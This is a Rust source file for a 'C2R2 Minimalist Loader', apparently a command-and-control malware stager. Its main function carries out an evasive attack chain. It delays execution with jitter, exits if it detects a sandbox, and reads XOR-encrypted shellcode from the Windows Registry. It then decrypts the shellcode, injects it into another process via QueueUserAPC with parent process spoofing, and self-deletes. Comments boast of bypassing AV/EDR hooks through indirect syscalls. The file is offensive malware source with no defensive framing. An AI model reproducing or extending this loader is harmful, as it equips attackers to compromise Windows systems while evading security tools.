//! C2R2 Minimalist Loader
//!
//! This loader implements a stealthy persistence mechanism:
//! 1. Reads XOR-encrypted shellcode from Windows Registry
//! 2. Decrypts shellcode using polymorphic XOR key
//! 3. Performs process injection via QueueUserAPC
//! 4. Optional self-delete after execution
//!
//! Features:
//! - Polymorphic XOR key (changes each deployment)
//! - Jitter timing (random delays before execution)
//! - Parent Process Spoofing (runs under explorer.exe)
//! - Indirect syscalls via dinvk (bypasses AV/EDR hooks)
//! - Anti-sandbox checks

#![cfg_attr(feature = "production", windows_subsystem = "windows")]
#![allow(dead_code)] // Some functions only used on Windows

mod config;
mod evasion;
mod injection;
mod registry;
mod syscalls;

use std::thread;
use std::time::Duration;

fn main() {
    // Step 1: Jitter timing - random delay before any action
    // This evades behavioral analysis that expects immediate execution
    let jitter_ms = evasion::get_jitter_delay();
    thread::sleep(Duration::from_millis(jitter_ms));

    // Step 2: Anti-sandbox checks (production only)
    #[cfg(feature = "production")]
    {
        if evasion::is_sandbox_detected() {
            // Exit silently without any indication
            return;
        }
    }

    // Step 3: Additional random delay after sandbox check
    let delay = evasion::get_random_delay(500, 2000);
    thread::sleep(Duration::from_millis(delay));

    // Step 4: Read encrypted shellcode from registry
    #[cfg(target_os = "windows")]
    {
        let shellcode = match registry::read_shellcode_from_registry() {
            Ok(data) => data,
            Err(_) => return, // Fail silently
        };

        // Step 5: Decrypt shellcode using polymorphic XOR key
        let xor_key = config::get_xor_key();
        let decrypted = xor_decrypt(&shellcode, xor_key);

        // Step 6: Execute via process injection with Parent Process Spoofing
        let _ = injection::inject_and_execute(&decrypted);

        // Step 7: Optional self-delete
        #[cfg(feature = "production")]
        {
            let _ = evasion::self_delete();
        }
    }
}

/// XOR decrypt data with key
fn xor_decrypt(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &byte)| byte ^ key[i % key.len()])
        .collect()
}
